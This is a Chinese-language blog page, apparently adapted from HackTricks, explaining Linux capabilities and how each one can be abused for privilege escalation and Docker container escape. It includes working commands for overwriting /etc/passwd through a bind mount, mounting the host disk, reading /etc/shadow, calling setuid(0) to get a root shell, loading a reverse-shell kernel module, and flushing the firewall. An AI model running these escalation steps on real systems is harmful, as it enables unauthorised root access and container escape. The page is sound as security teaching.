@@ -1,0 +1,1093 @@
+
+
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#FFF">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico">
+  <meta http-equiv="Cache-Control" content="no-transform">
+  <meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+<link rel="alternate" type="application/rss+xml" title="Hexo" href="http://example.com/rss.xml" />
+<link rel="alternate" type="application/atom+xml" title="Hexo" href="http://example.com/atom.xml" />
+<link rel="alternate" type="application/json" title="Hexo" href="http://example.com/feed.json" />
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="/css/app.css?v=0.2.5">
+
+  
+
+<link rel="canonical" href="http://example.com/2023/08/02/yuque/Capabilities/">
+
+
+
+  <title>
+docker底层原理+capability |
+Yume Shoka = Hexo</title>
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div id="loading">
+    <div class="cat">
+      <div class="body"></div>
+      <div class="head">
+        <div class="face"></div>
+      </div>
+      <div class="foot">
+        <div class="tummy-end"></div>
+        <div class="bottom"></div>
+        <div class="legs left"></div>
+        <div class="legs right"></div>
+      </div>
+      <div class="paw">
+        <div class="hands left"></div>
+        <div class="hands right"></div>
+      </div>
+    </div>
+  </div>
+  <div id="container">
+    <header id="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="inner">
+        <div id="brand">
+          <div class="pjax">
+          
+  <h1 itemprop="name headline">docker底层原理+capability
+  </h1>
+  
+<div class="meta">
+  <span class="item" title="Created: 2023-08-02 13:38:45">
+    <span class="icon">
+      <i class="ic i-calendar"></i>
+    </span>
+    <span class="text">Posted on</span>
+    <time itemprop="dateCreated datePublished" datetime="2023-08-02T13:38:45+08:00">2023-08-02</time>
+  </span>
+</div>
+
+
+          </div>
+        </div>
+        <nav id="nav">
+  <div class="inner">
+    <div class="toggle">
+      <div class="lines" aria-label="Toggle navigation bar">
+        <span class="line"></span>
+        <span class="line"></span>
+        <span class="line"></span>
+      </div>
+    </div>
+    <ul class="menu">
+      <li class="item title"><a href="/" rel="start">Yume Shoka</a></li>
+    </ul>
+    <ul class="right">
+      <li class="item theme">
+        <i class="ic i-sun"></i>
+      </li>
+      <li class="item search">
+        <i class="ic i-search"></i>
+      </li>
+    </ul>
+  </div>
+</nav>
+
+      </div>
+      <div id="imgs" class="pjax">
+        <ul>
+          <li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1gipev1x5e4j20zk0m8b29.jpg"></li>
+          <li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1giclil3m4ej20zk0m8tn8.jpg"></li>
+          <li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1giciszlczyj20zk0m816d.jpg"></li>
+          <li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1giclwrdwyaj20zk0m8are.jpg"></li>
+          <li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1gicljitigmj20zk0m87fp.jpg"></li>
+          <li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1gipexj2jgzj20zk0m8b09.jpg"></li>
+        </ul>
+      </div>
+    </header>
+    <div id="waves">
+      <svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
+        <defs>
+          <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" />
+        </defs>
+        <g class="parallax">
+          <use xlink:href="#gentle-wave" x="48" y="0" />
+          <use xlink:href="#gentle-wave" x="48" y="3" />
+          <use xlink:href="#gentle-wave" x="48" y="5" />
+          <use xlink:href="#gentle-wave" x="48" y="7" />
+        </g>
+      </svg>
+    </div>
+    <main>
+      <div class="inner">
+        <div id="main" class="pjax">
+          
+  <div class="article wrap">
+    
+<div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
+<i class="ic i-home"></i>
+<span><a href="/">Home</a></span>
+</div>
+
+    <article itemscope itemtype="http://schema.org/Article" class="post block" lang="en">
+  <link itemprop="mainEntityOfPage" href="http://example.com/2023/08/02/yuque/Capabilities/">
+
+  <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="image" content="/images/avatar.jpg">
+    <meta itemprop="name" content="John Doe">
+    <meta itemprop="description" content=", ">
+  </span>
+
+  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="Hexo">
+  </span>
+
+  <div class="body md" itemprop="articleBody">
+    
+
+    <h1 id="docker底层原理capability"><a class="markdownIt-Anchor" href="#docker底层原理capability">#</a> docker 底层原理 + capability</h1>
+<h2 id="capability"><a class="markdownIt-Anchor" href="#capability">#</a> Capability</h2>
+<p>Linux 是一种安全的操作系统，它把所有的系统权限都赋予了一个单一的 root 用户，只给普通用户保留有限的权限。root 用户拥有超级管理员权限，可以安装软件、允许某些服务、管理用户等。</p>
+<p>作为普通用户，如果想执行某些只有管理员才有权限的操作，以前只有两种办法：一是通过  <code>sudo</code>  提升权限，如果用户很多，配置管理和权限控制会很麻烦；二是通过 <span class="exturl" data-url="aHR0cHM6Ly9lbi53aWtpcGVkaWEub3JnL3dpa2kvU2V0dWlk">SUID</span>（Set User ID on execution）来实现，它可以让普通用户允许一个  <code>owner</code>  为 root 的可执行文件时具有 root 的权限。</p>
+<p><code>SUID</code>  虽然可以解决问题，但却带来了安全隐患。当运行设置了  <code>SUID</code>  的命令时，通常只是需要很小一部分的特权，但是  <code>SUID</code>  给了它 root 具有的全部权限。这些可执行文件是黑客的主要目标，如果他们发现了其中的漏洞，就很容易利用它来进行安全攻击。简而言之，<strong> <code>SUID</code>  机制增大了系统的安全攻击面。</strong></p>
+<p>为了对 root 权限进行更细粒度的控制，实现按需授权，Linux 引入了另一种机制叫  <code>capabilities</code> 。</p>
+<p><code>Capabilities</code>  机制是在 Linux 内核  <code>2.2</code>  之后引入的，原理很简单，就是将之前与超级用户 root（UID=0）关联的特权细分为不同的功能组，Capabilites 作为线程（<strong>Linux 并不真正区分进程和线程</strong>）的属性存在，每个功能组都可以独立启用和禁用。其本质上就是将内核调用分门别类，具有相似功能的内核调用被分到同一组中。</p>
+<p>这样一来，权限检查的过程就变成了：在执行特权操作时，如果线程的有效身份不是 root，就去检查其是否具有该特权操作所对应的 capabilities，并以此为依据，决定是否可以执行特权操作。</p>
+<p>Capabilities 可以在进程执行时赋予，也可以直接从父进程继承。所以理论上如果给 nginx 可执行文件赋予了  <code>CAP_NET_BIND_SERVICE</code>  capabilities，那么它就能以普通用户运行并监听在 80 端口上。</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">capability 名称</th>
+<th style="text-align:left">描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">CAP_AUDIT_CONTROL</td>
+<td style="text-align:left">启用和禁用内核审计；改变审计过滤规则；检索审计状态和过滤规则</td>
+</tr>
+<tr>
+<td style="text-align:left">CAP_AUDIT_READ</td>
+<td style="text-align:left">允许通过 multicast netlink 套接字读取审计日志</td>
+</tr>
+<tr>
+<td style="text-align:left">CAP_AUDIT_WRITE</td>
+<td style="text-align:left">将记录写入内核审计日志</td>
+</tr>
+<tr>
+<td style="text-align:left">CAP_BLOCK_SUSPEND</td>
+<td style="text-align:left">使用可以阻止系统挂起的特性</td>
+</tr>
+<tr>
+<td style="text-align:left">CAP_CHOWN</td>
+<td style="text-align:left">修改文件所有者的权限</td>
+</tr>
+<tr>
+<td style="text-align:left">CAP_DAC_OVERRIDE</td>
+<td style="text-align:left">忽略文件的 DAC 访问限制</td>
+</tr>
+<tr>
+<td style="text-align:left">CAP_DAC_READ_SEARCH</td>
+<td style="text-align:left">忽略文件读及目录搜索的 DAC 访问限制</td>
+</tr>
+<tr>
+<td style="text-align:left">CAP_FOWNER</td>
+<td style="text-align:left">忽略文件属主 ID 必须和进程用户 ID 相匹配的限制</td>
+</tr>
+<tr>
+<td style="text-align:left">CAP_FSETID</td>
+<td style="text-align:left">允许设置文件的 setuid 位</td>
+</tr>
+<tr>
+<td style="text-align:left">CAP_IPC_LOCK</td>
+<td style="text-align:left">允许锁定共享内存片段</td>
+</tr>
+<tr>
+<td style="text-align:left">CAP_IPC_OWNER</td>
+<td style="text-align:left">忽略 IPC 所有权检查</td>
+</tr>
+<tr>
+<td style="text-align:left">CAP_KILL</td>
+<td style="text-align:left">允许对不属于自己的进程发送信号</td>
+</tr>
+<tr>
+<td style="text-align:left">CAP_LEASE</td>
+<td style="text-align:left">允许修改文件锁的 FL_LEASE 标志</td>
+</tr>
+<tr>
+<td style="text-align:left">CAP_LINUX_IMMUTABLE</td>
+<td style="text-align:left">允许修改文件的 IMMUTABLE 和 APPEND 属性标志</td>
+</tr>
+<tr>
+<td style="text-align:left">CAP_MAC_ADMIN</td>
+<td style="text-align:left">允许 MAC 配置或状态更改</td>
+</tr>
+<tr>
+<td style="text-align:left">CAP_MAC_OVERRIDE</td>
+<td style="text-align:left">忽略文件的 DAC 访问限制</td>
+</tr>
+<tr>
+<td style="text-align:left">CAP_MKNOD</td>
+<td style="text-align:left">允许使用 mknod () 系统调用</td>
+</tr>
+<tr>
+<td style="text-align:left">CAP_NET_ADMIN</td>
+<td style="text-align:left">允许执行网络管理任务</td>
+</tr>
+<tr>
+<td style="text-align:left">CAP_NET_BIND_SERVICE</td>
+<td style="text-align:left">允许绑定到小于 1024 的端口</td>
+</tr>
+<tr>
+<td style="text-align:left">CAP_NET_BROADCAST</td>
+<td style="text-align:left">允许网络广播和多播访问</td>
+</tr>
+<tr>
+<td style="text-align:left">CAP_NET_RAW</td>
+<td style="text-align:left">允许使用原始套接字</td>
+</tr>
+<tr>
+<td style="text-align:left">CAP_SETGID</td>
+<td style="text-align:left">允许改变进程的 GID</td>
+</tr>
+<tr>
+<td style="text-align:left">CAP_SETFCAP</td>
+<td style="text-align:left">允许为文件设置任意的 capabilities</td>
+</tr>
+<tr>
+<td style="text-align:left">CAP_SETPCAP</td>
+<td style="text-align:left">参考 capabilities man page</td>
+</tr>
+<tr>
+<td style="text-align:left">CAP_SETUID</td>
+<td style="text-align:left">允许改变进程的 UID</td>
+</tr>
+<tr>
+<td style="text-align:left">CAP_SYS_ADMIN</td>
+<td style="text-align:left">允许执行系统管理任务，如加载或卸载文件系统、设置磁盘配额等</td>
+</tr>
+<tr>
+<td style="text-align:left">CAP_SYS_BOOT</td>
+<td style="text-align:left">允许重新启动系统</td>
+</tr>
+<tr>
+<td style="text-align:left">CAP_SYS_CHROOT</td>
+<td style="text-align:left">允许使用 chroot () 系统调用</td>
+</tr>
+<tr>
+<td style="text-align:left">CAP_SYS_MODULE</td>
+<td style="text-align:left">允许插入和删除内核模块</td>
+</tr>
+<tr>
+<td style="text-align:left">CAP_SYS_NICE</td>
+<td style="text-align:left">允许提升优先级及设置其他进程的优先级</td>
+</tr>
+<tr>
+<td style="text-align:left">CAP_SYS_PACCT</td>
+<td style="text-align:left">允许执行进程的 BSD 式审计</td>
+</tr>
+<tr>
+<td style="text-align:left">CAP_SYS_PTRACE</td>
+<td style="text-align:left">允许跟踪任何进程</td>
+</tr>
+<tr>
+<td style="text-align:left">CAP_SYS_RAWIO</td>
+<td style="text-align:left">允许直接访问 /devport、/dev/mem、/dev/kmem 及原始块设备</td>
+</tr>
+<tr>
+<td style="text-align:left">CAP_SYS_RESOURCE</td>
+<td style="text-align:left">忽略资源限制</td>
+</tr>
+<tr>
+<td style="text-align:left">CAP_SYS_TIME</td>
+<td style="text-align:left">允许改变系统时钟</td>
+</tr>
+<tr>
+<td style="text-align:left">CAP_SYS_TTY_CONFIG</td>
+<td style="text-align:left">允许配置 TTY 设备</td>
+</tr>
+<tr>
+<td style="text-align:left">CAP_SYSLOG</td>
+<td style="text-align:left">允许使用 syslog () 系统调用</td>
+</tr>
+<tr>
+<td style="text-align:left">CAP_WAKE_ALARM</td>
+<td style="text-align:left">允许触发一些能唤醒系统的东西 (比如 CLOCK_BOOTTIME_ALARM 计时器)</td>
+</tr>
+</tbody>
+</table>
+<h3 id="不同capabilities带来的安全问题"><a class="markdownIt-Anchor" href="#不同capabilities带来的安全问题">#</a> 不同 capabilities 带来的安全问题</h3>
+<p><span class="exturl" data-url="aHR0cHM6Ly9ib29rLmhhY2t0cmlja3MueHl6L2xpbnV4LWhhcmRlbmluZy9wcml2aWxlZ2UtZXNjYWxhdGlvbi9saW51eC1jYXBhYmlsaXRpZXM=">Linux Capabilities - HackTricks</span></p>
+<h3 id="cap_sys_admin"><a class="markdownIt-Anchor" href="#cap_sys_admin">#</a> CAP_SYS_ADMIN</h3>
+<p>Among other things this allows to <strong>mount devices</strong> or abuse <strong>release_agent</strong> to escape from the container.</p>
+<p>即有了该权限，可以挂载设备，比如通过挂载实现 /etc/passwd 文件的替换，来获取 root 权限</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">getcap -r / 2&gt;/dev/null</span><br><span class="line">/usr/bin/python2.7 = cap_sys_admin+ep</span><br><span class="line"></span><br><span class="line">cp /etc/passwd ./ #Create a copy of the passwd file</span><br><span class="line">openssl passwd -1 -salt abc password #Get hash of &quot;password&quot;</span><br><span class="line">vim ./passwd #Change roots passwords of the fake passwd file</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">libc = CDLL(<span class="string">&quot;libc.so.6&quot;</span>)</span><br><span class="line">libc.mount.argtypes = (c_char_p, c_char_p, c_char_p, c_ulong, c_char_p)</span><br><span class="line">MS_BIND = <span class="number">4096</span></span><br><span class="line">source = <span class="string">b&quot;/path/to/fake/passwd&quot;</span></span><br><span class="line">target = <span class="string">b&quot;/etc/passwd&quot;</span></span><br><span class="line">filesystemtype = <span class="string">b&quot;none&quot;</span></span><br><span class="line">options = <span class="string">b&quot;rw&quot;</span></span><br><span class="line">mountflags = MS_BIND</span><br><span class="line">libc.mount(source, target, filesystemtype, mountflags, options)</span><br></pre></td></tr></table></figure>
+<p>替换 x 的位置之后，root 的密码就变成了在 /etc/passwd 里面的密码，可以通过 su + 自己创建的密码获取权限</p>
+<p>也可以实现挂载宿主机文件并随意访问</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">fdisk -l <span class="comment">#Get disk name</span></span><br><span class="line">Disk /dev/sda: 4 GiB, 4294967296 bytes, 8388608 sectors</span><br><span class="line">Units: sectors of 1 * 512 = 512 bytes</span><br><span class="line">Sector size (logical/physical): 512 bytes / 512 bytes</span><br><span class="line">I/O size (minimum/optimal): 512 bytes / 512 bytes</span><br><span class="line"></span><br><span class="line">mount /dev/sda /mnt/ <span class="comment">#Mount it</span></span><br><span class="line"><span class="built_in">cd</span> /mnt</span><br><span class="line"><span class="built_in">chroot</span> ./ bash <span class="comment">#You have a shell inside the docker hosts disk</span></span><br></pre></td></tr></table></figure>
+<p>或者如果 ssh 是开放的，那么可以在容器内挂载，并且找到开放的端口，ssh 连接宿主机</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Like in the example before, the first step is to mount the docker host disk</span></span><br><span class="line">fdisk -l</span><br><span class="line">mount /dev/sda /mnt/</span><br><span class="line"></span><br><span class="line"><span class="comment">#Then, search for open ports inside the docker host</span></span><br><span class="line">nc -v -n -w2 -z 172.17.0.1 1-65535</span><br><span class="line">(UNKNOWN) [172.17.0.1] 2222 (?) open</span><br><span class="line"></span><br><span class="line"><span class="comment">#Finally, create a new user inside the docker host and use it to access via SSH</span></span><br><span class="line"><span class="built_in">chroot</span> /mnt/ adduser john</span><br><span class="line">ssh john@172.17.0.1 -p 2222</span><br></pre></td></tr></table></figure>
+<h3 id="cap_sys_ptrace"><a class="markdownIt-Anchor" href="#cap_sys_ptrace">#</a> CAP_SYS_PTRACE</h3>
+<p>通过在宿主机运行的进程中注入 shellcode 实现逃逸，如果要访问宿主机进程，必须使用 ** <code>--pid=host</code> ** 参数运行容器</p>
+<p><a target="_blank" rel="noopener" href="https://man7.org/linux/man-pages/man7/capabilities.7.html"><strong>CAP_SYS_PTRACE</strong></a> allows to use  <code>ptrace(2)</code>  and recently introduced cross memory attach system calls such as  <code>process_vm_readv(2)</code>  and  <code>process_vm_writev(2)</code> . If this capability is granted and the  <code>ptrace(2)</code>  system call itself is not blocked by a seccomp filter, this will allow an attacker to bypass other seccomp restrictions, see <span class="exturl" data-url="aHR0cHM6Ly9naXN0LmdpdGh1Yi5jb20vdGhlamgvODM0NmY0N2UzNTlhZGVjZDFkNTM=">PoC for bypassing seccomp if ptrace is allowed</span> or the <strong>following PoC</strong>:</p>
+<h3 id="cap_sys_module"><a class="markdownIt-Anchor" href="#cap_sys_module">#</a> CAP_SYS_MODULE</h3>
+<p>CAP_SYS_MODULE 允许进程加载和卸载任意内核模块。</p>
+<p>可以实现在主机的内核中插入 / 删除内核模块</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">getcap -r / 2&gt;/dev/null</span><br><span class="line">/usr/bin/python2.7 = cap_sys_module+ep</span><br></pre></td></tr></table></figure>
+<p>modprobe 检测 /lib/modules/$(uname -r) 目录中依赖关系和映射表，我们可以伪造一个虚假的<strong> lib/modules</strong> 文件夹</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir lib/modules -p</span><br><span class="line">cp -a /lib/modules/5.0.0-20-generic/ lib/modules/$(uname -r)</span><br></pre></td></tr></table></figure>
+<p>编译内核模块并移动到这个文件夹</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp reverse-shell.ko lib/modules/$(uname -r)/</span><br></pre></td></tr></table></figure>
+<p>最后通过 python 加载内核模块</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import kmod</span><br><span class="line">km = kmod.Kmod()</span><br><span class="line">km.set_mod_dir(&quot;/path/to/fake/lib/modules/5.0.0-20-generic/&quot;)</span><br><span class="line">km.modprobe(&quot;reverse-shell&quot;)</span><br></pre></td></tr></table></figure>
+<h3 id="cap_dac_read_search"><a class="markdownIt-Anchor" href="#cap_dac_read_search">#</a> CAP_DAC_READ_SEARCH</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CAP_DAC_READ_SEARCH允许进程绕过文件读取检查和目录读/执行检查</span><br></pre></td></tr></table></figure>
+<p>二进制文件可以读取任何文件，因此可以使用 tar 来读取 /etc/shadow 文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd /etc</span><br><span class="line">tar -czf /tmp/shadow.tar.gz shadow #Compress show file in /tmp</span><br><span class="line">cd /tmp</span><br><span class="line">tar -cxf shadow.tar.gz</span><br></pre></td></tr></table></figure>
+<h3 id="cap_dac_override"><a class="markdownIt-Anchor" href="#cap_dac_override">#</a> CAP_DAC_OVERRIDE</h3>
+<p>可以绕过对任何文件的写权限检查，造成任意写文件。可以通过覆盖很多文件来提权</p>
+<p>比如修改 /etc/sudoers</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">getcap -r / 2&gt;/dev/null</span><br><span class="line">/usr/bin/vim = cap_dac_override+ep</span><br><span class="line"> </span><br><span class="line">vim /etc/sudoers #To overwrite it</span><br></pre></td></tr></table></figure>
+<h3 id="cap_chown"><a class="markdownIt-Anchor" href="#cap_chown">#</a> CAP_CHOWN</h3>
+<p>可以改变文件的所有者</p>
+<p>假设 python 具有这种能力，那么我们更改 /etc/shadow 文件的所有者，更改 root 密码，提权</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import os;os.chown(&quot;/etc/shadow&quot;,1000,1000)&#x27;</span><br></pre></td></tr></table></figure>
+<h3 id="cap_fowner"><a class="markdownIt-Anchor" href="#cap_fowner">#</a> CAP_FOWNER</h3>
+<p>可以改变任何文件的权限</p>
+<p>假如 python 具有这种权限，那么可以改修 shadow 文件来逃逸</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import os;os.chmod(&quot;/etc/shadow&quot;,0666)</span><br></pre></td></tr></table></figure>
+<h3 id="cap_setuid"><a class="markdownIt-Anchor" href="#cap_setuid">#</a> CAP_SETUID</h3>
+<p>可以设置创建进程的 UID，造成逃逸</p>
+<p>假如 python 具有这种权限</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">os.setuid(0)</span><br><span class="line">os.system(&quot;/bin/bash&quot;)</span><br></pre></td></tr></table></figure>
+<h3 id="cap_setgid"><a class="markdownIt-Anchor" href="#cap_setgid">#</a> CAP_SETGID</h3>
+<p>设置创建文件的 SGID</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">os.setgid(42)</span><br><span class="line">os.system(&quot;/bin/bash&quot;)</span><br></pre></td></tr></table></figure>
+<h3 id="cap_setfcap"><a class="markdownIt-Anchor" href="#cap_setfcap">#</a> CAP_SETFCAP</h3>
+<p>可以对文件或进程设置 capabilities</p>
+<p>如果 python 有了这个 capability，可以实现 docker 逃逸</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">import ctypes, sys</span><br><span class="line"></span><br><span class="line">#Load needed library</span><br><span class="line">#You can find which library you need to load checking the libraries of local setcap binary</span><br><span class="line"># ldd /sbin/setcap</span><br><span class="line">libcap = ctypes.cdll.LoadLibrary(&quot;libcap.so.2&quot;)</span><br><span class="line"></span><br><span class="line">libcap.cap_from_text.argtypes = [ctypes.c_char_p]</span><br><span class="line">libcap.cap_from_text.restype = ctypes.c_void_p</span><br><span class="line">libcap.cap_set_file.argtypes = [ctypes.c_char_p,ctypes.c_void_p]</span><br><span class="line"></span><br><span class="line">#Give setuid cap to the binary</span><br><span class="line">cap = &#x27;cap_setuid+ep&#x27;</span><br><span class="line">path = sys.argv[1]</span><br><span class="line">print(path)</span><br><span class="line">cap_t = libcap.cap_from_text(cap)</span><br><span class="line">status = libcap.cap_set_file(path,cap_t)</span><br><span class="line"></span><br><span class="line">if(status == 0):</span><br><span class="line">    print (cap + &quot; was successfully added to &quot; + path)</span><br></pre></td></tr></table></figure>
+<h3 id="cap_sys_rawio"><a class="markdownIt-Anchor" href="#cap_sys_rawio">#</a> CAP_SYS_RAWIO</h3>
+<p>可以实现访问 /dev/mem <code>, </code> /dev/kmem <code>or</code> /proc/kcore，修改  <code>mmap_min_addr</code>  以及调用各种磁盘命令，这有助于权限提升和 docker 逃逸</p>
+<h3 id="cap_kill"><a class="markdownIt-Anchor" href="#cap_kill">#</a> CAP_KILL</h3>
+<p>可以 kill 掉任何进程</p>
+<p>假设 python 具有这种能力，可以修改服务和 socket 配置，那么可以进行后门操作，然后 kill 相关的进程，并通过后门操作等待新配置文件的执行</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Use this python code to kill arbitrary processes</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> signal</span><br><span class="line">pgid = os.getpgid(<span class="number">341</span>)</span><br><span class="line">os.killpg(pgid, signal.SIGKILL)</span><br></pre></td></tr></table></figure>
+<h3 id="cap_net_bind_service"><a class="markdownIt-Anchor" href="#cap_net_bind_service">#</a> CAP_NET_BIND_SERVICE</h3>
+<p>可以在任何端口，甚至特权端口监听，但是不能直接使用这个 capability 提权、</p>
+<p>如果 python 具有这个 capability，可以监听任意端口，甚至可以从该端口连接到其他端口，有些服务需要特权端口连接</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import socket</span><br><span class="line">s=socket.socket()</span><br><span class="line">s.bind((&#x27;0.0.0.0&#x27;, 80))</span><br><span class="line">s.listen(1)</span><br><span class="line">conn, addr = s.accept()</span><br><span class="line">while True:</span><br><span class="line">        output = connection.recv(1024).strip();</span><br><span class="line">        print(output)</span><br><span class="line">        </span><br><span class="line">import socket</span><br><span class="line">s=socket.socket()</span><br><span class="line">s.bind((&#x27;0.0.0.0&#x27;,500))</span><br><span class="line">s.connect((&#x27;10.10.10.10&#x27;,500))</span><br></pre></td></tr></table></figure>
+<h3 id="cap_net_raw"><a class="markdownIt-Anchor" href="#cap_net_raw">#</a> CAP_NET_RAW</h3>
+<p>可以为可用的命名空间创建 RAW 和 PACKET 套接字。这可以通过公开的网络接口产生和传输任意的数据数据包</p>
+<p>可以嗅探流量，但不能直接提权。tcpdump 有这个 capability 可以获取网络数据包</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">getcap -r / 2&gt;/dev/null</span><br><span class="line">/usr/sbin/tcpdump = cap_net_raw+ep</span><br></pre></td></tr></table></figure>
+<h3 id="cap_net_admin-cap_net_raw"><a class="markdownIt-Anchor" href="#cap_net_admin-cap_net_raw">#</a> CAP_NET_ADMIN + CAP_NET_RAW</h3>
+<p>允许修改暴露的命名空间的防火墙，路由表，套接字等权限。提供网络接口混杂模式，可以进行跨名称空间嗅探</p>
+<p>如果 python 具有这种能力</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#Dump iptables filter table rules</span><br><span class="line">import iptc</span><br><span class="line">import pprint</span><br><span class="line">json=iptc.easy.dump_table(&#x27;filter&#x27;,ipv6=False)</span><br><span class="line">pprint.pprint(json)</span><br><span class="line"></span><br><span class="line">#Flush iptables filter table</span><br><span class="line">import iptc</span><br><span class="line">iptc.easy.flush_table(&#x27;filter&#x27;)</span><br></pre></td></tr></table></figure>
+<h3 id="cap_linux_immutable"><a class="markdownIt-Anchor" href="#cap_linux_immutable">#</a> CAP_LINUX_IMMUTABLE</h3>
+<p>可以修改 iNode 属性</p>
+<p>如果 python 具有此功能，那么可以删除不可变的属性让他变得可修改</p>
